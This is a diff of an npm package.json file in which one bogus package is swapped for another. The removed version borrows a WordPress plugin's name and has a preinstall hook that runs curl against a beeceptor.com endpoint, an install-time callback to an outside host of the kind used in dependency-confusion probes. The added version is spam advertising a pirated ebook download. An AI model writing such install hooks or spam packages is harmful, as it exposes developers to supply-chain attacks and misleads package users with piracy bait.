@@ -1,12 +1,1 @@
-{
-  "name": "addthis-wordpress-plugin",
-  "version": "2.0.0",
-  "description": "foysal1197",
-  "main": "index.js",
-  "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "curl https://bes23.free.beeceptor.com"
-  },
-  "author": "",
-  "license": "ISC"
-}
+{"name": "down_load_ebook_la_meditation_de_pleine_conscience_pour_les_nuls_p_by_shamash_alidina_elisabeth_couzon_helene_filipe_fih8s", "version": "4.0.3", "description": "Download ebook pdf mobi epub Shamash Alidina, Elisabeth Couzon & H\u00e9l\u00e8ne Filipe La M\u00e9ditation de pleine conscience pour les Nuls p: available now with direct link", "main": "index.js", "scripts": {"test": "echo \"Error: no test specified\" && exit 1"}, "author": "billycathrine6897", "license": "ISC"}
